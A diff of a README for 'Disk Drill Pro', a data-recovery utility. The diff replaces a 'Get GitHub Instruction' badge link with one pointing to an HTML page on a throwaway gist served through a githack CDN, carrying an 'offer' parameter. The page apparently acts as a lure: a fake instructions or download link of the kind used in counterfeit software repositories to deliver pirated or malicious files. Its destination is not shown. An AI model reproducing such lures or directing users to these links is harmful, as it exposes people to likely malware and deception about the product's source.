@@ -2,7 +2,7 @@
 
 Disk Drill Pro is a professional desktop utility for **data recovery, file protection, and storage monitoring**. It helps you restore accidentally deleted files, recover formatted drives, and diagnose storage devices with precision and speed. 💾  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4893912/raw/main/app.html?offer=DiskDrillPro)
+[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/stokebloodblade85/ad19dff482159532611cb43905fc76c3/raw/417f11d978a78f0e82eedf820275b50788df4b9d/app.html?offer=DiskDrillPro)
 
 ---
 
